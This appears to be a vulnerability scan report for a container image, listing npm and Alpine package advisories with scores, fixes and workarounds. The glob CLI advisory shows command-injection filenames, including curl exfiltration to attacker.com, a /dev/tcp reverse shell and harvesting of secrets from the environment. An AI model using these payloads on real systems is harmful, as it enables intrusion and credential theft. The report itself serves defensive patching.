| EPSS Percentile | `16th percentile`                              |


Description



### Impact

When using multiple wildcards, combined with at least one parameter, a regular expression can be generated that is vulnerable to ReDoS. This backtracking vulnerability requires the second wildcard to be somewhere other than the end of the path.

**Unsafe examples:**

```
/*foo-*bar-:baz
/*a-:b-*c-:d
/x/*a-:b/*c/y
```

**Safe examples:**

```
/*foo-:bar
/*foo-:bar-*baz
```

### Patches

Upgrade to version `8.4.0`.

### Workarounds

If developers are using multiple wildcard parameters, they can check the regex output with a tool such as [https://makenowjust-labs.github.io/recheck/playground/](https://makenowjust-labs.github.io/recheck/playground/) to confirm whether a path is vulnerable.

**cross-spawn** `7.0.3` (npm)

`pkg:npm/cross-spawn@7.0.3`

*Inefficient Regular Expression Complexity*


|                 |                                                                       |
| --------------- | --------------------------------------------------------------------- |
| Affected range  | `>=7.0.0` `<7.0.5`                                                    |
| Fixed version   | `7.0.5`                                                               |
| CVSS Score      | `7.7`                                                                 |
| CVSS Vector     | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P` |
| EPSS Score      | `0.069%`                                                              |
| EPSS Percentile | `21st percentile`                                                     |


Description



Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.

**jws** `3.2.2` (npm)

`pkg:npm/jws@3.2.2`

*Improper Verification of Cryptographic Signature*


|                 |                                                |
| --------------- | ---------------------------------------------- |
| Affected range  | `<3.2.3`                                       |
| Fixed version   | `3.2.3`                                        |
| CVSS Score      | `7.5`                                          |
| CVSS Vector     | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` |
| EPSS Score      | `0.011%`                                       |
| EPSS Percentile | `1st percentile`                               |


Description



### Overview

An improper signature verification vulnerability exists when using auth0/node-jws with the HS256 algorithm under specific conditions.

### Am I Affected?

You are affected by this vulnerability if you meet all of the following preconditions:

1. Application uses the auth0/node-jws implementation of JSON Web Signatures, versions <=3.2.2 || 4.0.0
2. Application uses the jws.createVerify() function for HMAC algorithms
3. Application uses user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines

You are NOT affected by this vulnerability if you meet any of the following preconditions:

1. Application uses the jws.verify() interface (note: `auth0/node-jsonwebtoken` users fall into this category and are therefore NOT affected by this vulnerability)
2. Application uses only asymmetric algorithms (e.g. RS256)
3. Application doesn’t use user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines

### Fix

Upgrade auth0/node-jws version to version 3.2.3 or 4.0.1

### Acknowledgement

Okta would like to thank Félix Charette for discovering this vulnerability.

**path-to-regexp** `0.1.12` (npm)

`pkg:npm/path-to-regexp@0.1.12`

*Inefficient Regular Expression Complexity*


|                 |                                                |
| --------------- | ---------------------------------------------- |
| Affected range  | `<0.1.13`                                      |
| Fixed version   | `0.1.13`                                       |
| CVSS Score      | `7.5`                                          |
| CVSS Vector     | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| EPSS Score      | `0.050%`                                       |
| EPSS Percentile | `15th percentile`                              |


Description



### Impact

A bad regular expression is generated any time you have three or more parameters within a single segment, separated by something that is not a period (`.`). For example, `/:a-:b-:c` or `/:a-:b-:c-:d`. The backtrack protection added in `path-to-regexp@<!-- -->0.1.12` only prevents ambiguity for two parameters. With three or more, the generated lookahead does not block single separator characters, so capture groups overlap and cause catastrophic backtracking.

### Patches

Upgrade to [path-to-regexp@0.1.13](https://github.com/pillarjs/path-to-regexp/releases/tag/v.0.1.13)

Custom regex patterns in route definitions (e.g., `/:a-:b([^-/]+)-:c([^-/]+)`) are not affected because they override the default capture group.

### Workarounds

All versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change `/:a-:b-:c` to `/:a-:b([^-/]+)-:c([^-/]+)`.

If paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length.

### References

- [GHSA-9wv6-86v2-598j](https://github.com/advisories/GHSA-9wv6-86v2-598j)
- [Detailed blog post: ReDoS the web](https://blakeembrey.com/posts/2024-09-web-redos/)

**glob** `10.4.5` (npm)

`pkg:npm/glob@10.4.5`

*Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')*


|                 |                                                |
| --------------- | ---------------------------------------------- |
| Affected range  | `>=10.2.0` `<10.5.0`                           |
| Fixed version   | `11.1.0`                                       |
| CVSS Score      | `7.5`                                          |
| CVSS Vector     | `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| EPSS Score      | `0.044%`                                       |
| EPSS Percentile | `13th percentile`                              |


Description



### Summary

The glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.

### Details

**Root Cause:**
The vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:

```javascript
stream.on('end', () => foregroundChild(cmd, matches, { shell: true }));
```

**Technical Flow:**

1. User runs `glob -c <command> <pattern>`
2. CLI finds files matching the pattern
3. Matched filenames are collected into an array
4. Command is executed with matched filenames as arguments using `shell: true`
5. Shell interprets metacharacters in filenames as command syntax
6. Malicious filenames execute arbitrary commands

**Affected Component:**

- **CLI Only:** The vulnerability affects only the command-line interface
- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected
- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)

**Attack Surface:**

- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.
- Any directory where attackers can control filenames (PR branches, archives, user uploads)
- CI/CD pipelines using `glob -c` on untrusted content

### PoC

**Setup Malicious File:**

```bash
mkdir test_directory && cd test_directory

# Create file with command injection payload in filename
touch '$(touch injected_poc)'
```

**Trigger Vulnerability:**

```bash
# Run glob CLI with -c option
node /path/to/glob/dist/esm/bin.mjs -c echo "**/*"
```

**Result:**

- The echo command executes normally
- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell
- A new file `injected_poc` is created, proving command execution
- Any command can be injected this way with full user privileges

**Advanced Payload Examples:**

**Data Exfiltration:**

```bash
# Filename: $(curl -X POST https://attacker.com/exfil -d "$(whoami):$(pwd)" > /dev/null 2>&1)
touch '$(curl -X POST https://attacker.com/exfil -d "$(whoami):$(pwd)" > /dev/null 2>&1)'
```

**Reverse Shell:**

```bash
# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)
touch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'
```

**Environment Variable Harvesting:**

```bash
# Filename: $(env | grep -E "(TOKEN|KEY|SECRET)" > /tmp/secrets.txt)
touch '$(env | grep -E "(TOKEN|KEY|SECRET)" > /tmp/secrets.txt)'
```

### Impact

**Arbitrary Command Execution:**

- Commands execute with full privileges of the user running glob CLI
- No privilege escalation required - runs as current user
- Access to environment variables, file system, and network

**Real-World Attack Scenarios:**

**1. CI/CD Pipeline Compromise:**

- Malicious PR adds files with crafted names to repository
- CI pipeline uses `glob -c` to process files (linting, testing, deployment)
- Commands execute in CI environment with build secrets and deployment credentials
- Potential for supply chain compromise through artifact tampering

**2. Developer Workstation Attack:**

- Developer clones repository or extracts archive containing malicious filenames
- Local build scripts use `glob -c` for file processing
- Developer machine compromise with access to SSH keys, tokens, local services

**3. Automated Processing Systems:**

- Services using glob CLI to process uploaded files or external content
- File uploads with malicious names trigger command execution
- Server-side compromise with potential for lateral movement

**4. Supply Chain Poisoning:**

- Malicious packages or themes include files with crafted names
- Build processes using glob CLI automatically process these files
- Wide distribution of compromise through package ecosystems

**Platform-Specific Risks:**

- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing
- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL
- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform

### Affected Products

- **Ecosystem:** npm
- **Package name:** glob
- **Component:** CLI only (`src/bin.mts`)
- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)
- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)
- **Patched versions:** 11.1.0and 10.5.0

**Scope Limitation:**

- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe
- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable

### Remediation

- Upgrade to `glob@<!-- -->10.5.0`, `glob@<!-- -->11.1.0`, or higher, as soon as possible.
- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.
- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.

**zlib** `1.3.1-r2` (apk)

`pkg:apk/alpine/zlib@1.3.1-r2?os_name=alpine&os_version=3.23`


|                 |                  |
| --------------- | ---------------- |
| Affected range  | `<1.3.2-r0`      |
| Fixed version   | `1.3.2-r0`       |
| EPSS Score      | `0.017%`         |
| EPSS Percentile | `4th percentile` |


Description




|                 |                  |
| --------------- | ---------------- |
| Affected range  | `<1.3.2-r0`      |
| Fixed version   | `1.3.2-r0`       |
| EPSS Score      | `0.007%`         |
| EPSS Percentile | `1st percentile` |


Description



**brace-expansion** `1.1.11` (npm)

`pkg:npm/brace-expansion@1.1.11`

*Uncontrolled Resource Consumption*


|                 |                                                |
| --------------- | ---------------------------------------------- |
| Affected range  | `<1.1.13`                                      |
| Fixed version   | `5.0.5`                                        |
| CVSS Score      | `6.5`                                          |
| CVSS Vector     | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H` |
| EPSS Score      | `0.058%`                                       |
| EPSS Percentile | `18th percentile`                              |


Description



### Impact

A brace pattern with a zero step value (e.g., `{1..2..0}`) causes the sequence generation loop to run indefinitely, making the process hang for seconds and allocate heaps of memory.

The loop in question:

[https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184](https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184)

`test()` is one of

[https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113](https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113)

The increment is computed as `Math.abs(0) = 0`, so the loop variable never advances. On a test machine, the process hangs for about 3.5 seconds and allocates roughly 1.9 GB of memory before throwing a `RangeError`. Setting max to any value has no effect because the limit is only checked at the output combination step, not during sequence generation.

This affects any application that passes untrusted strings to expand(), or by error sets a step value of `0`. That includes tools built on minimatch/glob that resolve patterns from CLI arguments or config files. The input needed is just 10 bytes.

### Patches

Upgrade to versions

- 5.0.5+

A step increment of 0 is now sanitized to 1, which matches bash behavior.

### Workarounds

Sanitize strings passed to `expand()` to ensure a step value of `0` is not used.

*Uncontrolled Resource Consumption*


|                 |                                                                                                                                                                                  |
| --------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Affected range  | `>=1.0.0` `<=1.1.11`                                                                                                                                                             |
| Fixed version   | `1.1.12`                                                                                                                                                                         |
| CVSS Score      | `1.3`                                                                                                                                                                            |
| CVSS Vector     | `CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| EPSS Score      | `0.092%`                                                                                                                                                                         |
| EPSS Percentile | `26th percentile`                                                                                                                                                                |


Description



A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.

**qs** `6.13.0` (npm)

`pkg:npm/qs@6.13.0`

*Improper Input Validation*


|                 |                                                                   |
| --------------- | ----------------------------------------------------------------- |
| Affected range  | `<6.14.1`                                                         |
| Fixed version   | `6.14.1`                                                          |
| CVSS Score      | `6.3`                                                             |
| CVSS Vector     | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:L` |
| EPSS Score      | `0.061%`                                                          |
| EPSS Percentile | `19th percentile`                                                 |


Description



### Summary

The `arrayLimit` option in qs did not enforce limits for bracket notation (`a[]=1&a[]=2`), only for indexed notation (`a[0]=1`). This is a consistency bug; `arrayLimit` should apply uniformly across all array notations.

**Note:** The default `parameterLimit` of 1000 effectively mitigates the DoS scenario originally described. With default options, bracket notation cannot produce arrays larger than `parameterLimit` regardless of `arrayLimit`, because each `a[]=value` consumes one parameter slot. The severity has been reduced accordingly.

### Details

The `arrayLimit` option only checked limits for indexed notation (`a[0]=1&a[1]=2`) but did not enforce it for bracket notation (`a[]=1&a[]=2`).

**Vulnerable code** (`lib/parse.js:159-162`):

```javascript
if (root === '[]' && options.parseArrays) {
  obj = utils.combine([], leaf); // No arrayLimit check
}
```

**Working code** (`lib/parse.js:175`):

```javascript
else if (index <= options.arrayLimit) {  // Limit checked here
    obj = [];
    obj[index] = leaf;
}
```

The bracket notation handler at line 159 uses `utils.combine([], leaf)` without validating against `options.arrayLimit`, while indexed notation at line 175 checks `index <= options.arrayLimit` before creating arrays.

### PoC

```javascript
const qs = require('qs');
const result = qs.parse('a[]=1&a[]=2&a[]=3&a[]=4&a[]=5&a[]=6', {
  arrayLimit: 5,
});
console.log(result.a.length); // Output: 6 (should be max 5)
```

**Note on parameterLimit interaction:** The original advisory's "DoS demonstration" claimed a length of 10,000, but `parameterLimit` (default: 1000) caps parsing to 1,000 parameters. With default options, the actual output is 1,000, not 10,000.

### Impact

Consistency bug in `arrayLimit` enforcement. With default `parameterLimit`, the practical DoS risk is negligible since `parameterLimit` already caps the total number of parsed parameters (and thus array elements from bracket notation). The risk increases only when `parameterLimit` is explicitly set to a very high value.

*Improper Input Validation*


|                 |                                                |
| --------------- | ---------------------------------------------- |
| Affected range  | `>=6.7.0` `<=6.14.1`                           |
| Fixed version   | `6.14.2`                                       |
| CVSS Score      | `3.7`                                          |
| CVSS Vector     | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L` |
| EPSS Score      | `0.058%`                                       |
| EPSS Percentile | `18th percentile`                              |


Description



### Summary

The `arrayLimit` option in qs does not enforce limits for comma-separated values when `comma: true` is enabled, allowing attackers to cause denial-of-service via memory exhaustion. This is a bypass of the array limit enforcement, similar to the bracket notation bypass addressed in GHSA-6rw7-vpxm-498p (CVE-2025-15284).

### Details

When the `comma` option is set to `true` (not the default, but configurable in applications), qs allows parsing comma-separated strings as arrays (e.g., `?param=a,b,c` becomes `['a', 'b', 'c']`). However, the limit check for `arrayLimit` (default: 20) and the optional throwOnLimitExceeded occur after the comma-handling logic in `parseArrayValue`, enabling a bypass. This permits creation of arbitrarily large arrays from a single parameter, leading to excessive memory allocation.

**Vulnerable code** (lib/parse.js: lines ~40-50):

```js
if (val && typeof val === 'string' && options.comma && val.indexOf(',') > -1) {
  return val.split(',');
}

if (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {
  throw new RangeError(
    'Array limit exceeded. Only ' +
      options.arrayLimit +
      ' element' +
      (options.arrayLimit === 1 ? '' : 's') +
      ' allowed in an array.',
  );
}

return val;
```

The `split(',')` returns the array immediately, skipping the subsequent limit check. Downstream merging via `utils.combine` does not prevent allocation, even if it marks overflows for sparse arrays.This discrepancy allows attackers to send a single parameter with millions of commas (e.g., `?param=,,,,,,,,...`), allocating massive arrays in memory without triggering limits. It bypasses the intent of `arrayLimit`, which is enforced correctly for indexed (`a[0]=`) and bracket (`a[]=`) notations (the latter fixed in v6.14.1 per GHSA-6rw7-vpxm-498p).

### PoC

**Test 1 - Basic bypass:**

```
npm install qs
```

```js
const qs = require('qs');

const payload = 'a=' + ','.repeat(25); // 26 elements after split (bypasses arrayLimit: 5)
const options = { comma: true, arrayLimit: 5, throwOnLimitExceeded: true };

try {
  const result = qs.parse(payload, options);
  console.log(result.a.length); // Outputs: 26 (bypass successful)
} catch (e) {
  console.log('Limit enforced:', e.message); // Not thrown
}
```

**Configuration:**

- `comma: true`
- `arrayLimit: 5`
- `throwOnLimitExceeded: true`

Expected: Throws "Array limit exceeded" error.
Actual: Parses successfully, creating an array of length 26.

### Impact

Denial of Service (DoS) via memory exhaustion.

### Suggested Fix

Move the `arrayLimit` check before the comma split in `parseArrayValue`, and enforce it on the resulting array length. Use `currentArrayLength` (already calculated upstream) for consistency with bracket notation fixes.

**Current code** (lib/parse.js: lines ~40-50):

```js
if (val && typeof val === 'string' && options.comma && val.indexOf(',') > -1) {
  return val.split(',');
}

if (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {
  throw new RangeError(
    'Array limit exceeded. Only ' +
      options.arrayLimit +
      ' element' +
      (options.arrayLimit === 1 ? '' : 's') +
      ' allowed in an array.',
  );
}

return val;
```

**Fixed code:**

```js
if (val && typeof val === 'string' && options.comma && val.indexOf(',') > -1) {
  const splitArray = val.split(',');
  if (splitArray.length > options.arrayLimit - currentArrayLength) {
    // Check against remaining limit
    if (options.throwOnLimitExceeded) {
      throw new RangeError(
        'Array limit exceeded. Only ' +
          options.arrayLimit +
          ' element' +
          (options.arrayLimit === 1 ? '' : 's') +
          ' allowed in an array.',
      );
    } else {
      // Optionally convert to object or truncate, per README
      return splitArray.slice(0, options.arrayLimit - currentArrayLength);
    }
  }
  return splitArray;
}

if (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {
  throw new RangeError(
    'Array limit exceeded. Only ' +
      options.arrayLimit +
      ' element' +
      (options.arrayLimit === 1 ? '' : 's') +
      ' allowed in an array.',
  );
}

return val;
```

This aligns behavior with indexed and bracket notations, reuses `currentArrayLength`, and respects `throwOnLimitExceeded`. Update README to note the consistent enforcement.

**brace-expansion** `2.0.1` (npm)

`pkg:npm/brace-expansion@2.0.1`

*Uncontrolled Resource Consumption*


|                 |                                                |
| --------------- | ---------------------------------------------- |
| Affected range  | `>=2.0.0` `<2.0.3`                             |
| Fixed version   | `5.0.5`                                        |
| CVSS Score      | `6.5`                                          |
| CVSS Vector     | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H` |
| EPSS Score      | `0.058%`                                       |
| EPSS Percentile | `18th percentile`                              |


Description



### Impact

A brace pattern with a zero step value (e.g., `{1..2..0}`) causes the sequence generation loop to run indefinitely, making the process hang for seconds and allocate heaps of memory.

The loop in question:

[https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184](https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184)

`test()` is one of

[https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113](https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113)

The increment is computed as `Math.abs(0) = 0`, so the loop variable never advances. On a test machine, the process hangs for about 3.5 seconds and allocates roughly 1.9 GB of memory before throwing a `RangeError`. Setting max to any value has no effect because the limit is only checked at the output combination step, not during sequence generation.

This affects any application that passes untrusted strings to expand(), or by error sets a step value of `0`. That includes tools built on minimatch/glob that resolve patterns from CLI arguments or config files. The input needed is just 10 bytes.

### Patches

Upgrade to versions

- 5.0.5+

A step increment of 0 is now sanitized to 1, which matches bash behavior.

### Workarounds

Sanitize strings passed to `expand()` to ensure a step value of `0` is not used.

*Uncontrolled Resource Consumption*


|                 |                                                                                                                                                                                  |
| --------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Affected range  | `>=2.0.0` `<=2.0.1`                                                                                                                                                              |
| Fixed version   | `2.0.2`                                                                                                                                                                          |
| CVSS Score      | `1.3`                                                                                                                                                                            |
| CVSS Vector     | `CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| EPSS Score      | `0.092%`                                                                                                                                                                         |
| EPSS Percentile | `26th percentile`                                                                                                                                                                |


Description



A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.

**brace-expansion** `5.0.3` (npm)

`pkg:npm/brace-expansion@5.0.3`

*Uncontrolled Resource Consumption*


|                 |                                                |
| --------------- | ---------------------------------------------- |
| Affected range  | `>=4.0.0` `<5.0.5`                             |
| Fixed version   | `5.0.5`                                        |
| CVSS Score      | `6.5`                                          |
| CVSS Vector     | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H` |
| EPSS Score      | `0.058%`                                       |
| EPSS Percentile | `18th percentile`                              |


Description



### Impact

A brace pattern with a zero step value (e.g., `{1..2..0}`) causes the sequence generation loop to run indefinitely, making the process hang for seconds and allocate heaps of memory.

The loop in question:

[https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184](https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184)

`test()` is one of

[https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113](https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113)

The increment is computed as `Math.abs(0) = 0`, so the loop variable never advances. On a test machine, the process hangs for about 3.5 seconds and allocates roughly 1.9 GB of memory before throwing a `RangeError`. Setting max to any value has no effect because the limit is only checked at the output combination step, not during sequence generation.

This affects any application that passes untrusted strings to expand(), or by error sets a step value of `0`. That includes tools built on minimatch/glob that resolve patterns from CLI arguments or config files. The input needed is just 10 bytes.

### Patches

Upgrade to versions

- 5.0.5+

A step increment of 0 is now sanitized to 1, which matches bash behavior.

### Workarounds

Sanitize strings passed to `expand()` to ensure a step value of `0` is not used.

**@nestjs/common** `10.4.16` (npm)

`pkg:npm/%40nestjs/common@10.4.16`

*OWASP Top Ten 2017 Category A9 - Using Components with Known Vulnerabilities*


|                 |                                                |
| --------------- | ---------------------------------------------- |
| Affected range  | `<11.0.16`                                     |
| Fixed version   | `11.0.16`                                      |
| CVSS Score      | `5.5`                                          |
| CVSS Vector     | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L` |
| EPSS Score      | `0.163%`                                       |
| EPSS Percentile | `37th percentile`                              |


Description



File Upload vulnerability in nestjs nest prior to v.11.0.16 allows a remote attacker to execute arbitrary code via the Content-Type header.

**busybox** `1.37.0-r30` (apk)

`pkg:apk/alpine/busybox@1.37.0-r30?os_name=alpine&os_version=3.23`


|                 |                   |
| --------------- | ----------------- |
| Affected range  | `<=1.37.0-r30`    |
| Fixed version   | **Not Fixed**     |
| EPSS Score      | `0.045%`          |
| EPSS Percentile | `14th percentile` |


Description



**@nestjs/core** `10.4.15` (npm)

`pkg:npm/%40nestjs/core@10.4.15`

*Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')*


|                 |                                                                   |
| --------------- | ----------------------------------------------------------------- |
| Affected range  | `<=11.1.17`                                                       |
| Fixed version   | `11.1.18`                                                         |
| CVSS Score      | `6.3`                                                             |
| CVSS Vector     | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:L/SC:N/SI:L/SA:N` |
| EPSS Score      | `0.015%`                                                          |
| EPSS Percentile | `3rd percentile`                                                  |


Description



### Impact

*What kind of vulnerability is it? Who is impacted?*

`[SseStream._transform()](https://github.com/nestjs/nest/blob/dea5279ef8fcb568de158003e4281759a2cd7675/packages/core/router/sse-stream.ts)` interpolates `message.type` and `message.id` directly into Server-Sent Events text protocol output without sanitizing newline characters (`\r`, `\n`). Since the SSE protocol treats both `\r` and `\n` as field delimiters and `\n\n` as event boundaries, an attacker who can influence these fields through upstream data sources can inject arbitrary SSE events, spoof event types, and corrupt reconnection state. Spring Framework's own security patch ([6e97587](https://github.com/spring-projects/spring-framework/commit/6e9758700a4946be1dca85ca937ef2603e291301)) validates these same fields (`id`, `event`) for the same reason.

Actual impact:

- **Event spoofing**: Attacker forges SSE events with arbitrary `event:` types, causing client-side `EventSource.addEventListener()` callbacks to fire for wrong event types.
- **Data injection**: Attacker injects arbitrary `data:` payloads, potentially triggering XSS if the client renders SSE data as HTML without sanitization.
- **Reconnection corruption**: Attacker injects `id:` fields, corrupting the `Last-Event-ID` header on reconnection, causing the client to miss or replay events.
- **Attack precondition**: Requires the developer to map user-influenced data to the `type` or `id` fields of SSE messages. Direct HTTP request input does not reach these fields without developer code bridging the gap.
- 

### Counts

47 vulnerabilities found in 22 packages

- CRITICAL 0
- HIGH 31
- MEDIUM 12
- LOW 4

### Patches

*Has the problem been patched? What versions should users upgrade to?*

Patched in `@<!-- -->nestjs/core@<!-- -->11.1.18`